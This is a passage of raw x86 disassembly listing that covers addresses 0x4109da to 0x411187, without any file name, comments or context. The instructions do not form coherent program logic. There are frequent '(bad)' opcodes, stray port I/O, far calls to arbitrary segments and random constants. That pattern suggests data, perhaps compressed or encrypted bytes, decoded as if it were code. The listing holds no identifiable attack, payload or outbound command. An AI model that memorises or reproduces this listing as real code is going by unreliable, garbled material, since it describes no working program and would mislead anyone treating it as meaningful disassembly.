  4109da:	and    ch,BYTE PTR [ebx-0x1d8adc6a]
  4109e0:	outs   dx,DWORD PTR ds:[esi]
  4109e1:	rcl    BYTE PTR [ebp-0x7864419c],cl
  4109e7:	(bad)  
  4109e8:	push   edx
  4109e9:	repz in al,dx
  4109eb:	repnz (bad) 
  4109ee:	xor    cl,ch
  4109f0:	xchg   esp,eax
  4109f1:	pop    es
  4109f2:	stc    
  4109f3:	and    ebx,ebp
  4109f5:	aaa    
  4109f6:	idiv   BYTE PTR ss:[edi]
  4109f9:	push   ecx
  4109fa:	ins    DWORD PTR es:[edi],dx
  4109fb:	inc    ebx
  4109fc:	icebp  
  4109fd:	cmc    
  4109fe:	mov    esi,DWORD PTR [edi+0x7b5c4e32]
  410a04:	call   FWORD PTR [ecx]
  410a06:	sub    edi,DWORD PTR [eax-0x5d]
  410a09:	xchg   BYTE PTR [eax+0x3f668ed],ah
  410a0f:	int    0x5f
  410a11:	mov    edx,0xb640b1cd
  410a16:	push   edi
  410a17:	adc    edi,DWORD PTR gs:[edi]
  410a1a:	xchg   ecx,eax
  410a1b:	stos   DWORD PTR es:[edi],eax
  410a1c:	sbb    eax,0x587a24de
  410a21:	inc    ebp
  410a22:	imul   edi,DWORD PTR [edi+0x1e],0xffffffd1
  410a26:	jge    0x4109b3
  410a28:	nop
  410a29:	retf   0x8fd9
  410a2c:	pop    esp
  410a2d:	push   esp
  410a2e:	push   es
  410a2f:	mov    edx,DWORD PTR [eax]
  410a31:	into   
  410a32:	fst    DWORD PTR [esi+0x2d36966e]
  410a38:	pop    esi
  410a39:	repnz lahf 
  410a3b:	adc    esp,DWORD PTR [esi-0x7f3f5504]
  410a41:	cdq    
  410a42:	fld    DWORD PTR es:[edx+0x1e]
  410a46:	mov    esi,edx
  410a48:	add    DWORD PTR [edx],edx
  410a4a:	mov    al,0xa5
  410a4c:	in     eax,0xce
  410a4e:	or     BYTE PTR [ecx],ch
  410a50:	outs   dx,BYTE PTR ds:[esi]
  410a51:	nop
  410a52:	jae    0x410a99
  410a54:	fidivr WORD PTR [esi]
  410a56:	aaa    
  410a57:	jne    0x410aa2
  410a59:	sbb    DWORD PTR [eax],edi
  410a5b:	mov    ebp,DWORD PTR [ecx+0x6d]
  410a5e:	les    edi,FWORD PTR [esi+edi*4]
  410a61:	clc    
  410a62:	or     edx,DWORD PTR [edi-0x343f039]
  410a68:	xor    eax,0x50c6007e
  410a6d:	dec    edi
  410a6e:	pop    ecx
  410a6f:	retf   
  410a70:	ss push ecx
  410a72:	xor    eax,0x63db903a
  410a77:	ss fs rcl edx,cl
  410a7b:	mov    edi,0x54ecbe81
  410a80:	inc    eax
  410a81:	sub    eax,0x2b0b207f
  410a86:	push   ecx
  410a87:	jg     0x410ab3
  410a89:	outs   dx,BYTE PTR ds:[esi]
  410a8a:	jbe    0x410a95
  410a8c:	pop    edx
  410a8d:	or     DWORD PTR [ebp+0x36],0x7be8d6b5
  410a94:	(bad)  
  410a97:	jne    0x410ae0
  410a99:	inc    eax
  410a9a:	dec    ecx
  410a9b:	inc    edi
  410a9c:	mov    bl,BYTE PTR [eax+0x15]
  410a9f:	pop    es
  410aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410aa1:	xchg   ecx,eax
  410aa2:	dec    esp
  410aa3:	(bad)  
  410aa5:	sub    ecx,DWORD PTR [edi-0x62109da]
  410aab:	repnz adc ch,al
  410aae:	xchg   ebp,eax
  410aaf:	fsubr  QWORD PTR [ecx+0x0]
  410ab2:	pop    ds
  410ab3:	cmp    cl,dh
  410ab5:	mov    ds:0x693d1fd,eax
  410aba:	pushf  
  410abb:	inc    esp
  410abc:	call   0x212:0xa3c2d08
  410ac3:	outs   dx,BYTE PTR ds:[esi]
  410ac4:	(bad)  
  410ac6:	mov    al,0x2d
  410ac8:	mov    edx,0x9bb4ab24
  410acd:	push   edi
  410ace:	test   eax,0xe1d00cda
  410ad3:	or     eax,0xd4f6effe
  410ad8:	mov    ebx,0x7ea25f88
  410add:	test   DWORD PTR [edi+eax*1-0x7ec26326],esi
  410ae4:	js     0x410b5a
  410ae6:	nop
  410ae7:	push   edi
  410ae8:	push   ebx
  410ae9:	dec    edi
  410aea:	inc    esi
  410aeb:	xchg   esi,eax
  410aec:	push   ds
  410aed:	pop    ss
  410aee:	add    cl,ch
  410af0:	push   edx
  410af1:	and    ch,0x79
  410af4:	leave  
  410af5:	sbb    al,0xcd
  410af7:	test   ebp,edx
  410af9:	inc    ebx
  410afa:	jp     0x410aeb
  410afc:	out    dx,eax
  410afd:	jecxz  0x410b0e
  410aff:	aas    
  410b00:	icebp  
  410b01:	mov    ah,0x27
  410b03:	pushf  
  410b04:	jecxz  0x410b0b
  410b06:	push   edi
  410b07:	lods   al,BYTE PTR ds:[esi]
  410b08:	xor    BYTE PTR [edx+ebp*2],ch
  410b0b:	xchg   DWORD PTR [edx],ecx
  410b0d:	(bad)  
  410b0e:	es out dx,al
  410b10:	add    al,0x4c
  410b12:	mov    ss,WORD PTR [ecx-0x4e]
  410b15:	mov    ch,0xd
  410b17:	sar    DWORD PTR [ebx-0x1b8224ec],0x37
  410b1e:	aas    
  410b1f:	inc    ebp
  410b20:	push   ds
  410b21:	cld    
  410b22:	in     eax,0xc2
  410b24:	cmc    
  410b25:	or     al,0x11
  410b27:	fldenv [edx]
  410b29:	jb     0x410b5d
  410b2b:	stos   BYTE PTR es:[edi],al
  410b2c:	inc    eax
  410b2d:	xchg   edi,eax
  410b2e:	lock add BYTE PTR [edi],bl
  410b31:	mov    ebp,0x78790ca0
  410b36:	or     eax,0x4242e51b
  410b3b:	(bad)  
  410b3c:	stos   BYTE PTR es:[edi],al
  410b3d:	test   BYTE PTR [ebx+0x7a20381a],ah
  410b43:	mov    ds:0x92bfc96e,eax
  410b48:	lock fld DWORD PTR [esp+eax*8+0xc]
  410b4d:	ret    0xf82
  410b50:	jg     0x410b46
  410b52:	xlat   BYTE PTR ds:[ebx]
  410b53:	jg     0x410ada
  410b55:	inc    esi
  410b56:	mov    edi,0x9aa9f186
  410b5b:	dec    edx
  410b5c:	test   al,0x3c
  410b5e:	pop    ebx
  410b5f:	imul   eax,DWORD PTR [ecx],0x5cb76b8d
  410b65:	out    dx,eax
  410b66:	adc    bl,dh
  410b68:	lods   al,BYTE PTR ds:[esi]
  410b69:	ins    BYTE PTR es:[edi],dx
  410b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b6b:	jbe    0x410be4
  410b6d:	sub    BYTE PTR [edi+0x49],0xe
  410b71:	jp     0x410b3b
  410b73:	and    eax,0xd585010
  410b78:	jne    0x410b2e
  410b7a:	ficom  WORD PTR [eax+0x37]
  410b7d:	call   0x2c6d:0xba66de1d
  410b84:	mov    DWORD PTR ds:0xc0e9485,eax
  410b8a:	(bad)  
  410b8b:	(bad)  
  410b8c:	pop    eax
  410b8d:	xchg   edx,eax
  410b8e:	push   esp
  410b8f:	dec    edx
  410b90:	lahf   
  410b91:	mov    ebp,DWORD PTR [edi+0x2]
  410b94:	ud2    
  410b96:	sbb    BYTE PTR [edx+edi*4-0x2],ch
  410b9a:	inc    ebx
  410b9b:	xchg   edi,eax
  410b9c:	or     bh,BYTE PTR [ecx]
  410b9e:	bound  ebx,QWORD PTR [edi+0x46]
  410ba1:	xchg   DWORD PTR [edi],ebp
  410ba3:	stc    
  410ba4:	lock int3 
  410ba6:	js     0x410c06
  410ba8:	fisttp QWORD PTR [ecx-0x7b]
  410bab:	jmp    0x410c1d
  410bad:	dec    ebp
  410bae:	sbb    DWORD PTR [eax-0x4f],ebp
  410bb1:	and    ecx,DWORD PTR [ecx+0x485f73f7]
  410bb7:	cmp    eax,ebp
  410bb9:	imul   DWORD PTR [edx-0x6f1a7f23]
  410bbf:	sub    ecx,DWORD PTR [ebp+0x5a]
  410bc2:	mul    cl
  410bc4:	push   ss
  410bc5:	sub    BYTE PTR [esi+0x4b9eb8cb],bh
  410bcb:	xor    al,0x33
  410bcd:	or     DWORD PTR [edx],eax
  410bcf:	jnp    0x410bb5
  410bd1:	jmp    0xeb48:0x95b435e4
  410bd8:	and    DWORD PTR [ebp-0x7e263707],ebp
  410bde:	repnz loopne 0x410c2e
  410be1:	pop    DWORD PTR [edi+0x1f]
  410be4:	push   0xffffffb5
  410be6:	pmaddwd mm7,mm0
  410be9:	add    eax,edx
  410beb:	outs   dx,DWORD PTR ds:[esi]
  410bec:	stos   DWORD PTR es:[edi],eax
  410bed:	push   ebx
  410bee:	jmp    0xb9d2:0xcb6f3412
  410bf5:	push   ecx
  410bf6:	adc    eax,esp
  410bf8:	sbb    DWORD PTR [eax-0x744011d8],0xca58a81c
  410c02:	cli    
  410c03:	aas    
  410c04:	inc    ebx
  410c05:	nop
  410c06:	xor    ah,0x59
  410c09:	das    
  410c0a:	dec    edi
  410c0b:	mov    esp,0x6b7cd613
  410c10:	pop    es
  410c11:	jl     0x410c0a
  410c13:	outs   dx,BYTE PTR fs:[esi]
  410c15:	lods   al,BYTE PTR ds:[esi]
  410c16:	les    esp,FWORD PTR [esi]
  410c18:	(bad)  
  410c19:	cmp    al,BYTE PTR [eax-0x19]
  410c1c:	test   al,0xdb
  410c1e:	sahf   
  410c1f:	dec    edi
  410c20:	and    ah,BYTE PTR [eax-0x75c134a6]
  410c26:	out    dx,al
  410c27:	pop    es
  410c28:	sbb    BYTE PTR [edi+0x6ae3d53d],dh
  410c2e:	les    ecx,FWORD PTR [ebp-0x1a6176cf]
  410c34:	jg     0x410bfb
  410c36:	inc    ebp
  410c37:	sahf   
  410c38:	sar    BYTE PTR [edi+0x5ea9b98d],cl
  410c3e:	xchg   edi,eax
  410c3f:	pop    ds
  410c40:	test   al,0x0
  410c42:	or     BYTE PTR [edi],cl
  410c44:	fist   WORD PTR [ecx+0x79]
  410c47:	mov    dh,0x1c
  410c49:	icebp  
  410c4a:	mov    ebx,0x99c286c
  410c4f:	loope  0x410c1c
  410c51:	fnstcw WORD PTR ss:[edi]
  410c54:	xor    al,0x48
  410c56:	mov    edi,0x6b706476
  410c5b:	sub    al,0x16
  410c5d:	xlat   BYTE PTR ds:[ebx]
  410c5e:	retf   0x33ff
  410c61:	adc    BYTE PTR [edx-0x603f335],bl
  410c67:	push   eax
  410c68:	adc    edi,DWORD PTR [edx+0x1c]
  410c6b:	dec    eax
  410c6c:	call   0x6881:0x1eb3d7d0
  410c73:	out    dx,al
  410c74:	or     BYTE PTR [bx+si-0x325e],0x78
  410c7a:	adc    ebp,DWORD PTR cs:[esi-0x7eead840]
  410c81:	mov    dl,0xc1
  410c83:	mov    edi,0xa96dbd12
  410c88:	mov    ch,0xe2
  410c8a:	xchg   edi,eax
  410c8b:	add    eax,0xa6b2a394
  410c90:	scas   al,BYTE PTR es:[edi]
  410c91:	add    eax,DWORD PTR [eax-0x5f403558]
  410c97:	outs   dx,DWORD PTR ds:[esi]
  410c98:	add    dh,0xba
  410c9b:	clc    
  410c9c:	neg    BYTE PTR [edx]
  410c9e:	adc    eax,0x683c1b16
  410ca3:	sbb    ch,BYTE PTR [ebp-0x56]
  410ca6:	jecxz  0x410c67
  410ca8:	pusha  
  410ca9:	or     DWORD PTR [esi-0x75],esi
  410cac:	repz imul ebp,DWORD PTR [ecx],0x88552306
  410cb3:	(bad)  
  410cb4:	ss pop ebx
  410cb6:	mov    bl,BYTE PTR [eax-0x24]
  410cb9:	popf   
  410cba:	sbb    dl,BYTE PTR [esi-0x6f4e9005]
  410cc0:	mov    al,0xb9
  410cc2:	push   ebx
  410cc3:	imul   eax,ebx,0xffffff8d
  410cc6:	std    
  410cc7:	shl    DWORD PTR [ecx],cl
  410cc9:	stc    
  410cca:	xor    BYTE PTR [edx-0x6c],bl
  410ccd:	aad    0x3e
  410ccf:	fcomp  st(7)
  410cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cd2:	lahf   
  410cd3:	jmp    0xacdb:0x77ace3d1
  410cda:	mov    BYTE PTR [ecx],0x65
  410cdd:	mov    al,ds:0xbc52afeb
  410ce2:	adc    al,0x92
  410ce4:	add    BYTE PTR [ecx+0x71],0xef
  410ce8:	push   esi
  410ce9:	es das 
  410ceb:	aaa    
  410cec:	cmp    eax,0x116e3081
  410cf1:	and    DWORD PTR [ebp+0x52],eax
  410cf4:	pop    edi
  410cf5:	in     eax,dx
  410cf6:	mov    DWORD PTR [edx],0xf0438ed0
  410cfc:	sbb    al,0x17
  410cfe:	aam    0x2f
  410d00:	call   0xa04e931b
  410d05:	fnstcw WORD PTR [edx-0x22]
  410d08:	mov    DWORD PTR [eax+0x7089e6],edi
  410d0e:	cmp    eax,0xb338af38
  410d13:	mov    dh,0x90
  410d15:	mov    al,0x38
  410d17:	inc    eax
  410d18:	cs push edx
  410d1a:	shr    BYTE PTR [eax],0xd0
  410d1d:	retf   
  410d1e:	shl    edi,0x78
  410d21:	jle    0x410cab
  410d23:	mov    edx,0x906119b0
  410d28:	cdq    
  410d29:	inc    ebp
  410d2a:	fcmovbe st,st(5)
  410d2c:	mov    ecx,0x31413722
  410d31:	fwait
  410d32:	dec    edi
  410d33:	push   es
  410d34:	(bad)  
  410d35:	jl     0x410d7f
  410d37:	imul   ch
  410d39:	popf   
  410d3a:	pushf  
  410d3b:	lods   eax,DWORD PTR ds:[esi]
  410d3c:	inc    ecx
  410d3d:	in     al,dx
  410d3e:	adc    al,0xf6
  410d40:	dec    edi
  410d41:	and    ch,bh
  410d43:	addr16 or esp,ebx
  410d46:	(bad)  
  410d47:	std    
  410d48:	or     al,0xc5
  410d4a:	leave  
  410d4b:	mov    ds:0xd7f692cb,al
  410d50:	cli    
  410d51:	mov    dl,0x19
  410d53:	or     DWORD PTR [eax+0x6e],esp
  410d56:	stos   BYTE PTR es:[edi],al
  410d57:	retf   0xf8bf
  410d5a:	lea    ebp,[edi]
  410d5c:	rcl    BYTE PTR [esp+ebp*2+0x56],1
  410d60:	test   eax,0x609096c1
  410d65:	repz pop esi
  410d67:	and    eax,0x28de61db
  410d6c:	jne    0x410d36
  410d6e:	loopne 0x410cf1
  410d70:	std    
  410d71:	in     eax,dx
  410d72:	enter  0xe822,0x95
  410d76:	inc    bl
  410d78:	cmp    esp,DWORD PTR [ebp-0x3a]
  410d7b:	jg     0x410d4c
  410d7d:	inc    esp
  410d7e:	imul   BYTE PTR [eax+0xa5fc90e]
  410d84:	fisub  DWORD PTR [edi-0x2c]
  410d87:	dec    dh
  410d89:	(bad)  
  410d8a:	icebp  
  410d8b:	sub    DWORD PTR [esi-0x22],edi
  410d8e:	or     dh,0xf7
  410d91:	out    dx,eax
  410d92:	adc    BYTE PTR [edi+0x3b6c5218],0xd
  410d99:	mov    esp,0x8b3c25c1
  410d9e:	lea    edx,[eax+0x36adb994]
  410da4:	sub    eax,0x9bcedfe8
  410da9:	js     0x410e11
  410dab:	rcl    bh,0x10
  410dae:	clc    
  410daf:	(bad)  
  410db0:	gs pop esp
  410db2:	or     eax,eax
  410db4:	jo     0x410d94
  410db6:	mov    edx,0x68bb7d6
  410dbb:	xor    BYTE PTR [eax+0x2b],0x8
  410dbf:	out    0xea,al
  410dc1:	ret    
  410dc2:	in     al,dx
  410dc3:	loop   0x410daa
  410dc5:	xor    dh,BYTE PTR [edi]
  410dc7:	stos   DWORD PTR es:[edi],eax
  410dc8:	mov    esi,edi
  410dca:	in     eax,0xa1
  410dcc:	cli    
  410dcd:	lock sbb al,0xa7
  410dd0:	popa   
  410dd1:	sti    
  410dd2:	sub    DWORD PTR [esi+0x3bab5842],ebp
  410dd8:	xlat   BYTE PTR ds:[ebx]
  410dd9:	ja     0x410e20
  410ddb:	jecxz  0x410e3f
  410ddd:	imul   ebp,DWORD PTR [ecx+0x5c],0x71
  410de1:	lds    edi,FWORD PTR [esi]
  410de3:	iret   
  410de4:	push   ecx
  410de5:	mov    DWORD PTR [ebx+ebp*2-0x445109ba],ecx
  410dec:	gs jbe 0x410d89
  410def:	ret    
  410df0:	dec    eax
  410df1:	sbb    ebx,DWORD PTR [ebx+0x7a]
  410df4:	jg     0x410daa
  410df6:	cmp    DWORD PTR [eax-0x3b],ebx
  410df9:	jbe    0x410d7b
  410dfb:	inc    edx
  410dfc:	lea    edi,[edi-0x55]
  410dff:	arpl   ax,ax
  410e01:	inc    edx
  410e02:	xor    edi,DWORD PTR [eax+0x51a79497]
  410e08:	pop    ss
  410e09:	test   eax,0x665b754
  410e0e:	push   0xfffffffc
  410e10:	or     edi,ebx
  410e12:	hlt    
  410e13:	jp     0x410da3
  410e15:	jmp    0x401d8ebf
  410e1a:	outs   dx,BYTE PTR ds:[esi]
  410e1b:	inc    eax
  410e1c:	or     DWORD PTR [ebp+ebp*2+0x67],ebp
  410e20:	daa    
  410e21:	sti    
  410e22:	mov    eax,0x8fd1084c
  410e27:	call   0x9e0e22
  410e2c:	dec    esp
  410e2d:	cld    
  410e2e:	pop    ecx
  410e2f:	lahf   
  410e30:	xchg   esi,eax
  410e31:	dec    edx
  410e32:	jne    0x410e6c
  410e34:	ror    ebx,cl
  410e36:	call   0xbd49:0x92634560
  410e3d:	leave  
  410e3e:	and    BYTE PTR [esi+0x2f],ch
  410e41:	ror    DWORD PTR [esi-0x5fb49261],cl
  410e47:	or     edi,DWORD PTR [edi-0x7c]
  410e4a:	push   ebp
  410e4b:	ror    BYTE PTR [esi-0x11d1be64],1
  410e51:	sbb    ebx,esi
  410e53:	into   
  410e54:	jo     0x410ebe
  410e56:	add    ecx,DWORD PTR [esi-0x2f5b5e8f]
  410e5c:	enter  0xbd64,0x68
  410e60:	into   
  410e61:	lock jns 0x410e6c
  410e64:	test   BYTE PTR [ecx+0x71],dh
  410e67:	sub    DWORD PTR [ebx-0x397b85d7],ecx
  410e6d:	sar    BYTE PTR [ecx+0x50fb1ebb],1
  410e73:	push   0xffffff84
  410e75:	sbb    esp,DWORD PTR [esi+0x5fafb4bc]
  410e7b:	mov    ebp,0x724599b7
  410e80:	xor    BYTE PTR [ebp+0x0],cl
  410e83:	hlt    
  410e84:	cmc    
  410e85:	ror    BYTE PTR [ebp-0x4b6fcd85],cl
  410e8b:	cdq    
  410e8c:	ror    BYTE PTR [ebx+0x20],1
  410e8f:	adc    DWORD PTR [ecx+0xd],esi
  410e92:	pop    ds
  410e93:	dec    ecx
  410e94:	daa    
  410e95:	pop    ebx
  410e96:	jle    0x410f15
  410e98:	mov    esp,0x9df21190
  410e9d:	or     eax,0x9f1cd011
  410ea2:	inc    ebx
  410ea3:	arpl   WORD PTR ds:0x1e3c47b2,dx
  410ea9:	inc    ecx
  410eaa:	dec    esp
  410eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eac:	clc    
  410ead:	jecxz  0x410ed8
  410eaf:	in     eax,0xab
  410eb1:	mov    cl,0xcb
  410eb3:	dec    eax
  410eb4:	mov    al,0x12
  410eb6:	sbb    ch,ah
  410eb8:	xor    eax,0x4b82eca1
  410ebd:	jg     0x410e5f
  410ebf:	jmp    0x93476470
  410ec4:	mov    WORD PTR [ebp-0x50],fs
  410ec7:	xchg   ebp,eax
  410ec8:	add    BYTE PTR [ebx-0x4d16c15c],0x18
  410ecf:	cmp    eax,0x2f9de344
  410ed4:	clc    
  410ed5:	mov    bh,0x58
  410ed7:	pop    ecx
  410ed8:	xchg   esi,eax
  410ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eda:	(bad)  
  410edb:	cmp    BYTE PTR [ebp-0x48],bl
  410ede:	idiv   DWORD PTR [ecx-0x39]
  410ee1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ee2:	push   edx
  410ee3:	aas    
  410ee4:	sub    al,0x56
  410ee6:	pop    es
  410ee7:	nop
  410ee8:	cmp    al,0x12
  410eea:	jo     0x410ef3
  410eec:	ds stos DWORD PTR es:[edi],eax
  410eee:	in     al,dx
  410eef:	mov    DWORD PTR [ecx+0x6c9acb11],edi
  410ef5:	dec    esi
  410ef6:	mov    cl,0x68
  410ef8:	or     BYTE PTR [ebp+0x7a],0xa0
  410efc:	(bad)  
  410efd:	scas   eax,DWORD PTR es:[edi]
  410efe:	add    DWORD PTR [edi-0x7dca6c05],esi
  410f04:	ret    
  410f05:	sbb    eax,0xf7cfeb00
  410f0a:	aaa    
  410f0b:	(bad)  
  410f0c:	sbb    eax,0x858a4697
  410f11:	sub    eax,0xa6d37f95
  410f16:	pop    esi
  410f17:	daa    
  410f18:	fisub  DWORD PTR [eax+0x18]
  410f1b:	cmp    eax,0x5bd18081
  410f21:	or     eax,0x5cc1a246
  410f26:	sahf   
  410f27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f28:	sbb    esi,edx
  410f2a:	dec    esp
  410f2b:	rol    DWORD PTR [esi],cl
  410f2d:	mov    al,0xf2
  410f2f:	push   esp
  410f30:	in     al,dx
  410f31:	pop    ecx
  410f32:	dec    ebx
  410f33:	js     0x410ecf
  410f35:	xchg   esi,eax
  410f36:	loopne 0x410ec8
  410f38:	cmc    
  410f39:	js     0x410f57
  410f3b:	lods   al,BYTE PTR ds:[esi]
  410f3c:	les    edx,FWORD PTR [ebx-0x492701f1]
  410f42:	sub    al,0xa2
  410f44:	sub    eax,edx
  410f46:	rol    BYTE PTR [ebx],cl
  410f48:	and    BYTE PTR [edx-0x55592b8b],0xea
  410f4f:	cmp    al,0xbc
  410f51:	sbb    al,0x6e
  410f53:	or     DWORD PTR [eax],eax
  410f55:	clc    
  410f56:	push   esp
  410f57:	clc    
  410f58:	jmp    0x13b9:0xc1047f40
  410f5f:	fcom   QWORD PTR [esi-0x7e5e3033]
  410f65:	adc    al,0xa6
  410f67:	ret    
  410f68:	or     BYTE PTR [edx-0xf],al
  410f6b:	loop   0x410fbf
  410f6d:	fbstp  TBYTE PTR [edi+0x3b0ef3a2]
  410f73:	push   esi
  410f74:	scas   eax,DWORD PTR es:[edi]
  410f75:	arpl   WORD PTR [esi+0x52],ax
  410f78:	mov    dl,0x20
  410f7a:	xchg   ecx,eax
  410f7b:	adc    eax,ebp
  410f7d:	lds    esi,FWORD PTR [esi+0x2f712cb1]
  410f83:	pop    esp
  410f84:	sbb    BYTE PTR ds:0xa53ffb14,cl
  410f8a:	mov    bh,0xd1
  410f8c:	idiv   BYTE PTR [edi+ebx*4]
  410f8f:	js     0x410f9d
  410f91:	rcr    BYTE PTR [edx+0x62b7d18e],cl
  410f97:	sub    BYTE PTR [ebp-0x2237f877],cl
  410f9d:	add    edi,DWORD PTR [ecx]
  410f9f:	call   0x64781b53
  410fa4:	popf   
  410fa5:	cdq    
  410fa6:	and    DWORD PTR [edx],edi
  410fa8:	int    0x5f
  410faa:	sbb    ebx,ecx
  410fac:	pop    esp
  410fad:	push   ebp
  410fae:	sub    al,0x65
  410fb0:	mov    dh,0xb5
  410fb2:	repz retf 
  410fb4:	adc    eax,0x1c913bd6
  410fb9:	sbb    eax,0xdb01d208
  410fbe:	mov    esi,ds
  410fc0:	xor    edx,ebx
  410fc2:	pop    esp
  410fc3:	shl    BYTE PTR [edi],0xd3
  410fc6:	jne    0x410fbb
  410fc8:	push   ebp
  410fc9:	pushf  
  410fca:	push   ecx
  410fcb:	jno    0x410f7a
  410fcd:	inc    esi
  410fce:	imul   BYTE PTR [edi]
  410fd0:	jl     0x411007
  410fd2:	pop    eax
  410fd3:	inc    ebp
  410fd4:	daa    
  410fd5:	jg     0x411004
  410fd7:	(bad)  
  410fd8:	jmp    0x411020
  410fda:	cli    
  410fdb:	popa   
  410fdc:	adc    edx,0x3d
  410fdf:	sub    eax,0x1fe68fe8
  410fe4:	push   eax
  410fe5:	call   0xe57e5282
  410fea:	retf   0x1bd2
  410fed:	sbb    DWORD PTR [edx-0x3a9d947],0xffffffde
  410ff4:	out    0xa6,al
  410ff6:	mov    al,0x67
  410ff8:	and    eax,0xa5f940da
  410ffd:	in     al,0xa9
  410fff:	jns    0x410ff6
  411001:	popa   
  411002:	fdivrp st(0),st
  411004:	pop    edi
  411005:	int3   
  411006:	hlt    
  411007:	sub    al,BYTE PTR ds:0xf3293701
  41100d:	outs   dx,BYTE PTR ds:[esi]
  41100e:	jecxz  0x410fe1
  411010:	xor    dh,BYTE PTR [edi-0x55ae4b09]
  411016:	stos   DWORD PTR es:[edi],eax
  411017:	add    eax,0x38234a23
  41101c:	mov    cl,BYTE PTR [ecx-0x436847d]
  411022:	cmp    DWORD PTR [ecx],ebx
  411024:	lods   al,BYTE PTR ds:[esi]
  411025:	cli    
  411026:	sub    al,bh
  411028:	mov    ecx,0x4c5ed956
  41102d:	daa    
  41102e:	sbb    al,0x4f
  411030:	repnz xchg edi,eax
  411032:	cmp    BYTE PTR [ecx+0x4d05d0da],dl
  411038:	xchg   edi,eax
  411039:	daa    
  41103a:	inc    esi
  41103b:	jno    0x41105e
  41103d:	xchg   DWORD PTR [eax],ebx
  41103f:	and    DWORD PTR [ebx-0x15567da6],esp
  411045:	out    0x6,al
  411047:	imul   BYTE PTR [edi-0x18]
  41104a:	aad    0x5e
  41104c:	sub    DWORD PTR [edx+0x54],esi
  41104f:	add    dh,BYTE PTR [eax-0x80]
  411052:	cmp    al,0x6a
  411054:	ret    0x3dab
  411057:	lock or BYTE PTR [ebx+ecx*4+0x73],ch
  41105c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41105d:	add    ch,al
  41105f:	and    esp,ebp
  411061:	dec    edx
  411062:	ret    
  411063:	inc    esp
  411064:	outs   dx,DWORD PTR ds:[esi]
  411065:	sub    BYTE PTR [eax],bl
  411067:	fnstenv [ebx]
  411069:	jecxz  0x4110aa
  41106b:	or     dl,bh
  41106d:	inc    ecx
  41106e:	adc    ebx,DWORD PTR [edi+0x6e628a27]
  411074:	inc    ebp
  411075:	mov    ds:0x269c5bea,eax
  41107a:	inc    esi
  41107b:	outs   dx,DWORD PTR ds:[esi]
  41107c:	dec    edi
  41107d:	cmp    al,0xd8
  41107f:	or     al,0x84
  411081:	pop    ebx
  411082:	adc    BYTE PTR [ecx+0x4ec71860],cl
  411088:	mov    al,0x6d
  41108a:	popf   
  41108b:	mov    cl,0x11
  41108d:	repnz dec eax
  41108f:	cmp    di,WORD PTR [esi+0x4013150c]
  411096:	push   ebp
  411097:	aad    0x8b
  411099:	sbb    ecx,DWORD PTR [edi+0x33]
  41109c:	les    edx,FWORD PTR [ecx*2-0x1727749c]
  4110a3:	popf   
  4110a4:	in     eax,0x13
  4110a6:	sbb    eax,0x80fda8ef
  4110ab:	jae    0x41111b
  4110ad:	pusha  
  4110ae:	push   0x42421363
  4110b3:	int3   
  4110b4:	lahf   
  4110b5:	xor    eax,0xd9c73b13
  4110ba:	fsubr  st,st(5)
  4110bc:	stos   BYTE PTR es:[edi],al
  4110bd:	pop    esi
  4110be:	test   al,0xd3
  4110c0:	stos   DWORD PTR es:[edi],eax
  4110c1:	cmp    al,0x7e
  4110c3:	adc    dh,BYTE PTR [ecx+ebp*4]
  4110c6:	and    eax,0x3bf76b42
  4110cb:	mov    bl,0xc8
  4110cd:	clc    
  4110ce:	ja     0x411132
  4110d0:	adc    BYTE PTR [ecx+0x51],ch
  4110d3:	retf   
  4110d4:	test   eax,0x508f3232
  4110d9:	frstor [eax+0x22]
  4110dc:	fist   DWORD PTR [esi+ebx*8]
  4110df:	push   cs
  4110e0:	nop
  4110e1:	mov    eax,ds:0xb7ff4206
  4110e6:	pop    ebx
  4110e7:	enter  0x9250,0x1f
  4110eb:	pop    ebx
  4110ec:	mov    edi,0x34b04c2f
  4110f1:	fucomp st(5)
  4110f3:	test   BYTE PTR [ebx+0x7c0073b],bh
  4110f9:	scas   al,BYTE PTR es:[edi]
  4110fa:	mov    ecx,fs
  4110fc:	cmp    eax,0x9875aa72
  411101:	push   0x49
  411103:	jl     0x41112b
  411105:	adc    al,0xb4
  411107:	stos   DWORD PTR es:[edi],eax
  411108:	sahf   
  411109:	call   0x1bb5:0x88dcae69
  411110:	ja     0x411094
  411112:	mov    al,0x6d
  411114:	fsubr  QWORD PTR [edx-0x7932aca2]
  41111a:	imul   eax,DWORD PTR [ecx-0x5b],0x739a9c34
  411121:	xor    eax,DWORD PTR [esi-0x592ab2f5]
  411127:	or     cl,ch
  411129:	cmp    ch,bh
  41112b:	sub    DWORD PTR [esi],esi
  41112d:	pop    ds
  41112e:	lds    esi,FWORD PTR [ebp-0x1edc69ab]
  411134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411135:	loop   0x411156
  411137:	call   FWORD PTR ds:0xad4c1c64
  41113d:	data16 or BYTE PTR gs:[esi],0x22
  411142:	push   0x520f22a4
  411147:	out    0xd3,eax
  411149:	imul   ebx,DWORD PTR [ebx],0xfffffff0
  41114c:	test   cl,al
  41114e:	jl     0x411165
  411150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411151:	pop    ebx
  411152:	xor    BYTE PTR [eax+0x76],ah
  411155:	xchg   DWORD PTR [ecx-0x2daf6900],edi
  41115b:	rsqrtps xmm5,XMMWORD PTR [eax-0x15bafd7]
  411162:	xor    edx,DWORD PTR [edx+0x49]
  411165:	das    
  411166:	cmp    edx,ebp
  411168:	or     bh,BYTE PTR [edx-0x3e88f110]
  41116e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116f:	pop    es
  411170:	push   ds
  411171:	pop    ebp
  411172:	test   DWORD PTR [esi+0x32cfb8dc],ecx
  411178:	test   BYTE PTR [eax-0x7646be3c],dl
  41117e:	push   edi
  41117f:	push   edi
  411180:	pusha  
  411181:	xchg   edx,eax
  411182:	pop    edi
  411183:	out    0x8,al
  411185:	xchg   edx,ecx
  411187:	sbb    BYTE PTR [esi+0x22],ch
